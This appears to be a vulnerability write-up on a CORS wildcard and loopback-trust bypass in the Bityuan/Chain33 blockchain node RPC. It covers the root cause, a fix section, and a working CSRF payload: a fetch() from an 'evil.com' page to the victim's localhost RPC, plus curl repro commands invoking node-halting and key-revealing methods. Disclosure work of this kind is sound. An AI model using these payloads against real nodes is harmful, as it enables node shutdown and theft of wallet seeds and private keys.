# Bityuan / Chain33 CORS * + Loopback Bypass → CSRF to Privileged JRPC (2026-08)

Source: 2026-08-15 session, bityuan/bityuan wrapper (39 files) + bysomeone/chain33@f4252a735f2d + bysomeone/plugin@1ef9e26f3e85, host with `git --exec-path=/usr/local/libexec/git-core` missing `git-remote-https`, fetched via `codeload.github.com/.../zip/<commit>`.

## Root cause (3 lines)

* `rpc/http.go:38` `co := cors.New(cors.Options{})` — zero config → `rs/cors` defaults to `AllowedOrigins: ["*"]`, `AllowCredentials: false`, all headers allowed.
* `rpc/http.go:60-96` auth stack: `checkIPWhitelist(ip) → checkBasicAuth → parseJSONRpcParams → if !ipaddr.IsLoopback() { checkJrpcFuncBlacklist || !checkJrpcFuncWhitelist }`. Loopback skips the last gate. `rpc/server.go:193 checkIPWhitelist` also `IsLoopback→true` + `remoteIPWhitelist["0.0.0.0"]` wildcard for `whitelist=["*"]`.
* `rpc/ethrpc/rpc.go:143` `node.NewHTTPHandlerStack(rpcHandler.server, []string{"*"}, []string{"*"}, nil)` and `:154` `WebsocketHandler([]string{"*"})` + `rpc.go:215 ServeHTTP` only `checkIPWhitelist` then dispatch — same `*`.

Same pattern in gRPC: `rpc/http.go:159 isLoopBackAddr` (checks `*net.IPNet` not `*net.TCPAddr` — buggy but `checkIPWhitelist` still lets 127.0.0.1 through) + `rpc/http.go:169 if isLoopBackAddr→return nil` fast-path.

## Why it is CSRF

Browser at `http://evil.com` runs `fetch("http://127.0.0.1:8801", {method:"POST", headers:{"Content-Type":"application/json"}, body:'{"method":"Chain33.CloseQueue","params":[{}],"id":1}'})`. Preflight `OPTIONS` returns `Access-Control-Allow-Origin: *` (no credentials needed for `net/rpc/jsonrpc` which reads raw body, not cookies). Actual POST arrives with `Origin: http://evil.com`, `RemoteAddr: 127.0.0.1:xxxxx` (victim's loopback) → server treats as trusted, skips func WL/BL, dispatches `CloseQueue` / `DumpPrivkey` / `GetSeed` etc.

Default config `bityuan.toml:63-88`: `jrpcFuncWhitelist=["*"]`, `whitelist=["127.0.0.1"]`, `jrpcBindAddr="localhost:8801"`, eth `httpApi=[eth,web3,personal,admin,net]` on `localhost:8546`. At rest safe (loopback-only bind), but becomes pre-auth remote when operator sets `0.0.0.0:*` or `whitelist=["*"]`, and CSRF makes the loopback-only case remotely triggerable without any bind change.

## Privileged methods reachable

* JRPC wallet crown jewels (`rpc/jrpchandler.go`): `GetSeed:830` (plaintext seed with passwd), `DumpPrivkey:954`, `DumpPrivkeysFile:964` (`os.OpenFile(fileName, O_CREATE|O_APPEND|O_RDWR, 0666)` — attacker controls `FileName`, creates 0666 file at arbitrary writable path if not exists), `UnLock:616` (no rate limit), `ImportPrivkey:510`, `CloseQueue:1160` (`go CloseQueue()` after 100ms — node halt, default blacklist bypassed on loopback), plus generic `Query:926` / `ExecWallet:897` (`LoadExecutorType(execer).CreateQuery(FuncName, Payload)`) for any dapp.
* ethRPC personal (`rpc/ethrpc/personal/personal.go:69-99`): `personal_unlockAccount` / `personal_importRawKey` / `personal_sign` (which does `DumpPrivkey` internally) + `eth_accounts` enumeration, all unauth on `eth` namespace.

## Repro (no creds)

```bash
# From victim browser context — curl simulates the post-CORS POST arriving as loopback:
curl -s -H "Origin: http://evil.com" -H "Content-Type: application/json" \
  -d '{"method":"Chain33.GetWalletStatus","params":[{}],"id":1}' http://127.0.0.1:8801/ -v 2>&1 | grep -i access-control
# expect: Access-Control-Allow-Origin: *

# Privileged bypass (loopback skips blacklist):
curl -s -H "Content-Type: application/json" \
  -d '{"method":"Chain33.CloseQueue","params":[{}],"id":1}' http://127.0.0.1:8801/
# vs from non-loopback (if exposed): same payload returns `The CloseQueue method is not authorized!`

# ethRPC personal:
curl -s -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"personal_listAccounts","params":[],"id":1}' http://127.0.0.1:8546/
```

poc-reverification note: 2026-08 session proved in code, not live against mainnet — live would need victim-visit or a `0.0.0.0` node.

## Fix

* `rpc/http.go:38` set explicit `cors.Options{AllowedOrigins: []string{"http://localhost:*", "http://127.0.0.1:*"}, AllowedMethods: []string{"POST","OPTIONS"}, AllowedHeaders: []string{"Content-Type"}}` and `ethrpc/rpc.go:143/154` same (replace `*`).
* Remove `if !IsLoopback()` fast-path at `http.go:96/169`; enforce `checkJrpcFuncWhitelist/Blacklist` for all IPs. At minimum never exempt `CloseQueue/DumpPrivkey/GetSeed/SaveSeed/UnLock/ImportPrivkey/DumpPrivkeysFile`.
* Require non-empty `JrpcUserName/JrpcUserPasswd` (generate random on first run if missing) — `server.go:171 empty→true` is insecure default.
* `wallet/wallet_proc.go:1615` sanitize `FileName` with `filepath.Clean` + `filepath.Base` + allowlist dir; add `http.MaxBytesReader` at `rpc/http.go:77` (`ioutil.ReadAll(r.Body)` unbounded).
* Disable `personal` in default `bityuan.toml:88 httpApi` or gate it behind `checkBasicAuth`.
